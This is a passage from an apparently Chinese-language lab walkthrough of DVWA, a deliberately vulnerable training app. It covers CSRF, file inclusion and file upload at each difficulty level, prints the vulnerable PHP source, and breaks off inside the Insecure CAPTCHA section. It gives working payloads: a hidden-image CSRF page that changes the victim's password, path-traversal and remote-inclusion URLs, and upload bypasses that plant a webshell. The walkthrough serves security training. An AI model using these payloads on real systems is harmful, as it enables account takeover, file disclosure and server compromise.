sizeof( $octet ) == 4 ) ) { // If all 4 octets are int&#39;s put the IP back together. $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } else { // Ops. Let the user name theres a mistake echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><h3 id="四：CSRF"><a href="#四：CSRF" class="headerlink" title="四：CSRF"></a>四：CSRF</h3><p>Cross-Site Request Forgery，跨站请求伪造，也称为One Click Attack，或者Session Riding。</p><p>是一种对网站的恶意利用。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。</p><p>XSS与之相反，XSS利用站点内的信任用户进行攻击。</p><p>举个例子</p><p>下面这幅图片应该比较形象了，用户浏览器在不知情的情况下访问了A网站。并且A网站是可以正常访问的，因为Cookie并没有失效。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240200_145.jpg" alt=""><br>再举个实际中可能发生的例子</p><p>一个网站用户Bob可能正在浏览聊天论坛，而同时另一个用户Alice也在此论坛中，并且后者刚刚发布了一个具有Bob银行链接的图片消息。设想一下，Alice编写了一个在Bob的银行站点上进行取款的form提交的链接，并将此链接作为图片tag。如果Bob的银行在cookie中保存他的授权信息，并且此cookie没有过期，那么当Bob的浏览器尝试装载图片时将提交这个取款form和他的cookie，这样在没经Bob同意的情况下便授权了这次事务。</p><p>这个例子是上面的英文版描述。改变配置、强制提交信息、取消会员等危害。</p><p>CSRF是一种依赖web浏览器的、被混淆过的代理人攻击（deputy attack）</p><pre><code>CSRF攻击依赖下面的假定：1 攻击者了解受害者所在的站点2 攻击者的目标站点具有持久化授权cookie或者受害者具有当前会话cookie3 目标站点没有对用户在网站行为的第二授权</code></pre><p>low：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>代码中在获取了$pass_new和$pass_conf这两个变量之后，利用mysql_real_escape_string()函数进行了过滤，这样虽然可以防止SQL注入，但却无法阻止CSRF攻击，之后这两个变量便被直接代入UPDATE语句中执行了数据库更新操作。</p><blockquote><p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制</p></blockquote><p>CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p>漏洞利用</p><p>1.<br><a href="http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#" target="_blank" rel="external">http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成password</p><p>2.构造攻击页面</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。这里为了方便演示（才不是我租不起服务器= =），就在本地写一个test.html，下面是具体代码。</p><pre><code>&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</code></pre><p>当受害者访问test.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了hack</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Checks to see where the request came from if( eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) ) { // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } } else { // Didn&#39;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#39;t look correct.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt; </code></pre><p>可以看到这里在获取$pass_new和$pass_conf这两个变量之前，先利用一个if语句来判断“$_SERVER[‘HTTP_REFERER’]”的值是否是127.0.0.1。这是一种基本的防御CSRF攻击的方法：验证HTTP Referer字段。我们可以再次使用之前的方法来实施CSRF攻击，可以发现已经不起作用了。下面就来解释一下这种防御方法的原理。</p><p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。比如下面这个利用Burpsuite拦截到的数据包，数据要提交到的页面是upfile_Other.asp，而我们是通过Referer字段后的<a href="http://192168.80.131/upload_Other.asp这个页面发起的请求。" target="_blank" rel="external">http://192168.80.131/upload_Other.asp这个页面发起的请求。</a></p><blockquote><p>根据Referer验证请求来源，绕过思路：在HTTP请求头声明Referer。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710240213_708.png" alt=""></p></blockquote><p>High：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Change&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Get input $pass_new  = $_GET[ &#39;password_new&#39; ]; $pass_conf = $_GET[ &#39;password_conf&#39; ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p><p>这里需要管理员首先输入当前密码，然后才能重新设置密码。这就是目前非常有效的一种防御CSRF攻击的方法：二次确认。<br>不会</p><p>impossible：</p><p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p><hr><h3 id="五：文件包含漏洞"><a href="#五：文件包含漏洞" class="headerlink" title="五：文件包含漏洞"></a>五：文件包含漏洞</h3><p>文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。<br>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。<br>常见包含函数有：include()、require()<br>区别：</p><pre><code>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</code></pre><p>require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。</p><p>low：</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt; </code></pre><p>URL可发现，注入点在page，low等级直接注入<br><a href="http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile" target="_blank" rel="external">http://192.168.67.22/dvwa/vulnerabilities/fi/?page=/etc/profile</a><br>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241240_986.png" alt=""><br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br>成功进入服务器的php.ini文件<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241247_240.png" alt=""></p><p>构造url（相对路径）</p><pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpStudy\WWW\DVWA-1.9\php.ini</code></pre><p>2.远程文件包含</p><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在远程服务器192.168.5.12上传一个phpinfo.txt文件.<br>构造url</p><pre><code>http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=http://192.168.5.12/phpinfo.txt</code></pre><p>Medium:</p><p>&lt;php</p><p>//Thepagewewishtodisplay<br>$file=$_GET[‘page’];</p><p>//Inputvalidation<br>$file=str_replace(array(“<a href="http://&quot;,&quot;https://&quot;),&quot;&quot;,$file" target="_blank" rel="external">http://&quot;,&quot;https://&quot;),&quot;&quot;,$file</a>);<br>$file=str_replace(array(“../“,”..\””),””,$file);</p><p>&gt;</p><p>Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”<a href="https://”、" target="_blank" rel="external">https://”、</a> ” ../”、”..\”替换为空字符。</p><p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。<br>同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。</p><p>paylaod:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=D:\phpStudy\WWW\DVWA-1.9\php.ini</a></p><p>远程文件包含:<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.5.12/phpinfo.txt</a></p><p>High:</p><pre><code>&lt;php//Thepagewewishtodisplay$file=$_GET[&#39;page&#39;];//Inputvalidationif(!fnmatch(&quot;file*&quot;,$file)&amp;&amp;$file!=&quot;include.php&quot;){   //Thisisn&#39;tthepagewewant!echo&quot;ERROR:Filenotfound!&quot;;exit;}&gt;</code></pre><p>High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><p>思路：利用file协议绕过防护策略。<br>payload：<br><a href="http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini" target="_blank" rel="external">http://localhost:9096/DVWA-1.9/vulnerabilities/fi/?page=file:///D:\phpStudy\WWW\DVWA-1.9\php.ini</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241306_740.png" alt=""><br>至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p><p>Impossible：</p><pre><code>&lt;php//Thepagewewishtodisplay$file=$_GET[&#39;page&#39;];//Onlyallowinclude.phporfile{1..3}.phpif($file!=&quot;include.php&quot;&amp;&amp;$file!=&quot;file1.php&quot;&amp;&amp;$file!=&quot;file2.php&quot;&amp;&amp;$file!=&quot;file3.php&quot;){//Thisisn&#39;tthepagewewant!echo&quot;ERROR:Filenotfound!&quot;;exit;}&gt;</code></pre><p>Impossible级别的代码使用了白名单机制进行防护，白名单算是目前最有效的防过滤手段。</p><p>柠檬师傅的总结：<br><a href="http://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="external">文件包含漏洞小结</a></p><h3 id="五：File-Upload"><a href="#五：File-Upload" class="headerlink" title="五：File Upload"></a>五：File Upload</h3><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241313_324.png" alt=""></p><p>Low：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } ?&gt; </code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241319_392.png" alt=""><br>连接菜刀getshell~<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241336_64.png" alt=""><br>Medium：</p><p>&lt;?php </p><pre><code>if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Where are we going to be writing to? $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; // Is it an image? if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } else { // Yes! echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;; } } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } ?&gt;</code></pre><p>查看源码，可发现代码限制了MIME类型和文件大小<br>if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &amp;&amp; ( $uploaded_size &lt; 100000 ) )<br>绕过思路，改一下MIME类型即可。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241343_499.png" alt=""><br>上传cmd.jpg文件，抓包。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241344_12.png" alt=""><br>尝试修改filename为hack.php。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241345_547.png" alt=""><br>上菜刀得到shell~</p><p>截断绕过规则</p><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。</p><p>可以看到，包中的文件类型为image/png，可以通过文件类型检查。</p><p>High：</p><pre><code>    &lt;?php     if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1);     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Is it an image?     if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;     ( $uploaded_size &lt; 100000 ) &amp;&amp;     getimagesize( $uploaded_tmp ) ) {     // Can we move the file to the upload folder?     if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {     // No     echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;     }     else {     // Yes!     echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;     }     }     else {     // Invalid file     echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     }     }     ?&gt;</code></pre><p>可发现代码限制了后缀名，文件大小和用getimagesize检查文件头并判断文件大小</p><pre><code>&gt; // Is it an image? &gt; if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) )</code></pre><p>strrpos(string,find,start)</p><p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p><p>getimagesize(string filename)</p><p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。</p><p>可以看到，High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。</p><p>绕过思路：shell的后缀名改为jpg/jpeg/png，文件头插入jpg/png/gif的头部信息绕过getimagesize，<br>首先利用copy将一句话木马文件cmd.php与图片文件1.jpg合并Piccmd.jpg<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241425_841.png" alt=""></p><p>上菜刀得到shell</p><p>Impossible：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // File information $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ]; $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ]; $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]; $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; // Where are we going to be writing to? $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;; //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;; $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; $temp_file = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) ); $temp_file.= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; // Is it an image? if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp; getimagesize( $uploaded_tmp ) ) { // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#39;image/jpeg&#39; ) { $img = imagecreatefromjpeg( $uploaded_tmp ); imagejpeg( $img, $temp_file, 100); } else { $img = imagecreatefrompng( $uploaded_tmp ); imagepng( $img, $temp_file, 9); } imagedestroy( $img ); // Can we move the file to the web root from the temp folder? if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { // Yes! echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;; } else { // No echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; } // Delete any temp files if( file_exists( $temp_file ) ) unlink( $temp_file ); } else { // Invalid file echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>该级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><h3 id="七：Insecure-CAPTCHA"><a href="#七：Insecure-CAPTCHA" class="headerlink" title="七：Insecure CAPTCHA"></a>七：Insecure CAPTCHA</h3><p>reCAPTCHA验证流程</p><p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201710241444_780.jpg" alt=""></p><p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p><p>recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</p><p>low：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } mysql_close(); } ?&gt;</code></pre><p>通过构造参数绕过验证过程的第一步<br>首先输入密码，点击Change按钮，抓包，更改step参数=2绕过验证码</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &#39;recaptcha_private_key&#39; ], $_SERVER[ &#39;REMOTE_ADDR&#39; ], $_POST[ &#39;recaptcha_challenge_field&#39; ], $_POST[ &#39;recaptcha_response_field&#39; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) { // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; } else { // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) { // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;{$pass_new}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;{$pass_conf}\&quot; /&gt; &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt; &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt; &lt;/form&gt;&quot;; } else { // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; } } } if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) { // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new  = $_POST[ &#39;password_new&#39; ]; $pass_conf = $_POST[ &#39;password_conf&#39; ]; // Check to see if they did stage 1 if( !$_POST[ &#39;passed_captcha&#39; ] ) { $html .= &quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;; $hide_form = false; return; } // Check to see if both password match if( $pass_new == $pass_conf ) { // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; $result = mysql_query( $insert ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; } else { // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; } mysql_close(); } 